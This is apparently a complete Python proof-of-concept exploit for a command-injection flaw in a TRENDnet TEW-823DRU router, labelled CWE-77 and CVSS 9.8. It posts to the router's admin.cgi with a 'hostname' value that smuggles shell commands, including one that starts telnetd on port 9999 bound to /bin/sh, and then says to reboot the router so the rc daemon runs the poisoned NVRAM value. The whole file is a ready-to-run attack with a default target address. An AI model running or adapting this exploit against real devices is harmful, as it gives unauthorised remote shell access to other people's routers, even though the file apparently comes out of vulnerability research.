#!/usr/bin/env python3
"""PoC: TEW-823DRU sbin/rc NVRAM Command Injection | CWE-77 | CVSS 9.8
   FirmRec: 6 functions confirmed, simexp: 553 logs + 1 Vuln Paths"""
import requests, sys
T = sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
print(f"[*] TEW-823DRU rc Command Injection")
for p in ["; id; #", "; telnetd -p 9999 -l /bin/sh; #"]:
    try:
        r = requests.post(f"http://{T}/cgi-bin/admin.cgi",
            data={"hostname": f"Router{p}"}, timeout=5)
        print(f"  hostname='Router{p[:20]}...' → {r.status_code}")
    except: print(f"  hostname injection: device crashed/rebooted")
print("[*] Reboot router to trigger rc daemon with poisoned NVRAM")
